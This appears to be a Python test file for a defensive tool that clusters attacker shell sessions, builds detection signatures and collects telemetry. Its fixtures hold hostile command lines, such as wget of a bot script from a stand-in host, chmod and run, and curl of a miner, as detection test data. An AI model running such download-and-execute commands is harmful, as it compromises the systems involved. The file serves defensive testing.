import asyncio, json, os, sys, tempfile, urllib.error, urllib.request
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from nexus_shield import sdr, analysis, vaccine, telemetry
from nexus_shield.collector import Collector
from nexus_shield.telemetry import Event
from nexus_shield.demo import run

def ev(lines, gap=0.05, ip="1.1.1.1"):
    return Event(1.0, "n", ip + ":1", lines, [gap] * len(lines))

def test_cfo_estimate():
    for cfo in (-3400.0, 800.0, 1200.0):
        got, _ = sdr.estimate(sdr.synth_iq(cfo), 250_000)
        assert abs(got - cfo) < 100

def test_iq_roundtrip():
    p = tempfile.mktemp(); s = sdr.synth_iq(500.0, n=256); sdr.write_iq(p, s)
    assert abs(sdr.from_capture(p, 0).cfo_hz - 500) < 150

def test_fuzzy_cluster():
    a = ev(["root", "wget http://a/x.sh", "chmod +x x.sh"]); b = ev(["root", "wget http://b/y.sh", "chmod +x y.sh", "sh y.sh"])
    c = ev(["uname -a", "cat /proc/cpuinfo", "curl http://z/xmr"])
    assert analysis.cluster([a, b, c]) == [[0, 1], [2]]

def test_vaccine_excludes_benign_and_validates():
    mal = [ev(["root", "wget http://a/bot.sh", "chmod +x bot.sh"]) for _ in range(5)]
    ben = [ev(["alice", "ls", "pwd", "wget docs"], 3.0)]
    v, rep = vaccine.validate(mal, ben)
    assert "wget" not in v["tokens"] and rep["safe_to_deploy"]
    assert not any(vaccine.matches(v, b) for b in ben)

def test_collector_auth_and_roundtrip():
    c = Collector(token="t").start()
    def call(tok, data):
        r = urllib.request.Request(c.url + "/events", json.dumps(data).encode(), {"X-Token": tok})
        return urllib.request.urlopen(r).status
    try:
        assert call("t", {"ts": 1, "node": "n", "src": "1.1.1.1:1"}) == 200
        try: call("bad", {}); assert False
        except urllib.error.HTTPError as e: assert e.code == 401
        try: call("t", {"bogus": 1}); assert False
        except urllib.error.HTTPError as e: assert e.code == 400
        assert len(c.events) == 1
    finally: c.stop()

def test_live_demo_end_to_end():
    r = asyncio.run(run(out=lambda *_: None))
    assert r == {"attribution_ok": True, "variant_detected": True, "benign_false_tags": 0, "vaccines": 2}

if __name__ == "__main__":
    for n, f in sorted(globals().items()):
        if n.startswith("test_"): f(); print("ok", n)
